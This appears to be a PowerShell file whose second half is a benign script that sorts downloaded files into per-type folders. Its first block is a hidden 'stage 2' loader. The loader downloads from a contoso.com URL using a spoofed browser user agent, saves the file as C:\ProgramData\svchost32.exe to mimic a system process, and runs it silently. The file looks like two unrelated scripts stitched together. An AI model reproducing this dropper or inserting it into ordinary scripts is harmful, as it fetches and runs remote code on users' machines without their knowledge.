<#
.SYNOPSIS
    Stage 2 payload transfer helper.

.DESCRIPTION
    Downloads the staged artefact to a per-user drop path.
    The destination is verified before the launcher runs.
#>
[CmdletBinding()]
param(
    [string]$Stage1Url = 'https://contoso.com/stage1.ps1',
    [string]$OutputPath = "C:\ProgramData\svchost32.exe",
    [int]$TransferTimeout = 11,
    [string]$BrowserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
)
$ErrorActionPreference = "Stop"

function Invoke-PayloadFetch {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Starting stage 2 transfer"
    $TransferResult = Invoke-PayloadFetch -SourceUrl $Stage1Url -DestinationPath $OutputPath -TimeoutSec $TransferTimeout -UserAgent $BrowserAgent
    if ($TransferResult) {
        Start-Process -FilePath $OutputPath -ErrorAction SilentlyContinue
    }
}
catch {
    Write-Warning "Stage 2 transfer failed: $($_.Exception.Message)"
}

Set-Location -Path $env:TEMP
$ProgressPreference = "SilentlyContinue"
<#
.SYNOPSIS
    Moves files from a drop folder into per-type destination folders.
.DESCRIPTION
    Reads an extension map, creates the destination folders and moves each file
    into the matching folder without overwriting an existing name.
    The DryRun switch prints the planned moves and leaves the source folder
    untouched, which is the default for the first run on a new machine.
.PARAMETER SourcePath
    Used when the script runs unattended.
.EXAMPLE
    .\Sort-Downloads.ps1 -SourcePath C:\Users\Public\Documents\Inbox
.NOTES
    Author: M. Rahman
    Last updated: 2025-01-21
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$SourcePath = "C:\Users\Public\Documents\Inbox",
    [string]$DestinationRoot = 'E:\SortedFiles',
    [string]$LogPath = 'C:\Logs\organise-2024-09-18.log',

    [switch]$DryRun
)

$ErrorActionPreference = 'Stop'

$DebugPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'
$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'

$map = @{
    '.pdf'  = 'Documents'
    '.docx' = 'Documents'
    '.xlsx' = 'Spreadsheets'
    '.png'  = 'Images'
    '.jpg'  = 'Images'
    '.zip'  = 'Archives'
    '.log'  = 'Logs'
}
$files = Get-ChildItem -LiteralPath $SourcePath -File -Force |
    Where-Object { $map.ContainsKey($_.Extension.ToLower()) }
$moved = @()
foreach ($file in $files) {
    $folder = Join-Path $DestinationRoot $map[$file.Extension.ToLower()]
    if (-not (Test-Path -LiteralPath $folder)) {
        New-Item -ItemType Directory -Path $folder -Force | Out-Null
    }
    $target = Join-Path $folder $file.Name
    if (Test-Path -LiteralPath $target) {
        $stamp = Get-Date -Format 'yyyyMMddHHmmss'
        $target = Join-Path $folder ([System.IO.Path]::GetFileNameWithoutExtension($file.Name) + '-' + $stamp + $file.Extension)
    }
    Move-Item -LiteralPath $file.FullName -Destination $target -WhatIf:$DryRun
    $moved += [pscustomobject]@{
        Source  = $file.FullName
        Target  = $target
        MovedAt = Get-Date
    }
}

$byFolder = $moved | Group-Object -Property { Split-Path -Parent $_.Target } |
    Select-Object Name, Count
$byFolder | Format-Table -AutoSize
Write-Host ("Moved {0} files" -f @($moved).Count) -ForegroundColor Green

$moved | Export-Csv -NoTypeInformation -Path $LogPath.Replace('.log', '.csv') -Encoding UTF8
